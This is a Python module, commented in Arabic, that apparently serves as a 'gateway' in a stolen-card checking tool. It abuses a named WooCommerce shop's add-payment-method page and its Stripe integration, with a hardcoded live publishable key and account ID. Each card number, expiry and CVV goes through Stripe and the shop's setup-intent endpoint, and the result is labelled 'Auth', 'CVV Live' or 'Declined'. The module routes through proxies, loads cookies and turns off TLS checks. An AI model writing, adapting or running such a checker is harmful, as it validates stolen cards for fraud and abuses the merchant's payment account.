"""
بوابة الدفع: Stripe Auth ST-1
الموقع: www.mistyharbourseafood.com
نوع البوابة: Stripe Auth (WooCommerce Payments)
تدفق الطلبات:
1. GET /my-account/add-payment-method/ -> استخراج publishableKey و createSetupIntentNonce و accountId
2. POST https://api.stripe.com/v1/payment_methods -> الحصول على pm_id
3. POST /wp-admin/admin-ajax.php (action=create_setup_intent) -> النتيجة النهائية
"""
import aiohttp
import asyncio
import ssl
import re
from cookies_loader import load_cookies, get_cookies_path


async def req1_get_tokens(
    session: aiohttp.ClientSession,
    proxy_url: str = None,
) -> tuple[str, str, str]:
    """الخطوة 1: جلب publishableKey و nonce و accountId."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    }
    try:
        async with session.get(
            "https://www.mistyharbourseafood.com/my-account/add-payment-method/",
            headers=headers,
            proxy=proxy_url,
        ) as r:
            text1 = await r.text()

        # القيم الثابتة المستخرجة من تحليل الموقع
        pk = "pk_live_51ETDmyFuiXB5oUVxaIafkGPnwuNcBxr1pXVhvLJ4BrWuiqfG6SldjatOGLQhuqXnDmgqwRA7tDoSFlbY4wFji7KR0079TvtxNs"
        acc_id = "acct_1K9uXB2Eah1JTCdD"
        nonce_match = re.search(r'wcpay-create-setup-intent-nonce":"([^"]+)"', text1)
        nonce = nonce_match.group(1) if nonce_match else ""
        return pk, nonce, acc_id
    except Exception as e:
        raise RuntimeError(f"req1_get_tokens failed: {e}") from e


async def req2_create_payment_method(
    session: aiohttp.ClientSession,
    pk: str,
    acc_id: str,
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 2: إنشاء Payment Method عبر Stripe API."""
    headers = {
        "authority": "api.stripe.com",
        "accept": "application/json",
        "content-type": "application/x-www-form-urlencoded",
        "origin": "https://js.stripe.com",
        "referer": "https://js.stripe.com/",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    }
    data = {
        "type": "card",
        "card[number]": cc,
        "card[cvc]": cvv,
        "card[exp_month]": mes,
        "card[exp_year]": ano,
        "key": pk,
        "stripe_account": acc_id,
    }
    try:
        async with session.post(
            "https://api.stripe.com/v1/payment_methods",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            res = await r.json(content_type=None)

        pm_id = res.get("id")
        if not pm_id:
            error_msg = res.get("error", {}).get("message", "Unknown Stripe Error")
            raise RuntimeError(error_msg)
        return pm_id
    except RuntimeError:
        raise
    except Exception as e:
        raise RuntimeError(f"req2_create_payment_method failed: {e}") from e


async def req3_create_setup_intent(
    session: aiohttp.ClientSession,
    pm_id: str,
    nonce: str,
    proxy_url: str = None,
) -> str:
    """الخطوة 3: إنشاء Setup Intent والحصول على النتيجة النهائية."""
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
        "x-requested-with": "XMLHttpRequest",
        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
        "referer": "https://www.mistyharbourseafood.com/my-account/add-payment-method/",
    }
    data = {
        "action": "create_setup_intent",
        "wcpay-payment-method": pm_id,
        "_ajax_nonce": nonce,
    }
    try:
        async with session.post(
            "https://www.mistyharbourseafood.com/wp-admin/admin-ajax.php",
            headers=headers,
            data=data,
            proxy=proxy_url,
        ) as r:
            return await r.text()
    except Exception as e:
        raise RuntimeError(f"req3_create_setup_intent failed: {e}") from e


async def process_ST_1(
    cc: str,
    mes: str,
    ano: str,
    cvv: str,
    proxy_url: str = None,
) -> tuple[str, str]:
    """الدالة الرئيسية لفحص البطاقة عبر بوابة Stripe Auth ST-1."""
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    connector = aiohttp.TCPConnector(ssl=ssl_ctx)
    timeout = aiohttp.ClientTimeout(total=20)

    try:
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            cookies = load_cookies(get_cookies_path("ST-3Cookies.txt"))
            session.cookie_jar.update_cookies(cookies)

            pk, nonce, acc_id = await req1_get_tokens(session, proxy_url)
            pm_id = await req2_create_payment_method(session, pk, acc_id, cc, mes, ano, cvv, proxy_url)
            res3_text = await req3_create_setup_intent(session, pm_id, nonce, proxy_url)

    except RuntimeError as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", str(e)
    except Exception as e:
        return f"❌ | {cc}|{mes}|{ano}|{cvv}", f"Error: {e}"

    if "succeeded" in res3_text.lower():
        return f"𝐀𝐮𝐭𝐡 ✅ | {cc}|{mes}|{ano}|{cvv}", "Succeeded"
    elif "requires_action" in res3_text.lower() or "requires_source_action" in res3_text.lower():
        return f"𝐂𝐕𝐕 𝐋𝐢𝐯𝐞 ✅ | {cc}|{mes}|{ano}|{cvv}", "Requires Action"
    elif "card was declined" in res3_text.lower():
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Card was declined"
    elif "card number is incorrect" in res3_text.lower():
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", "Card number is incorrect"
    else:
        return f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌ | {cc}|{mes}|{ano}|{cvv}", res3_text[:120]
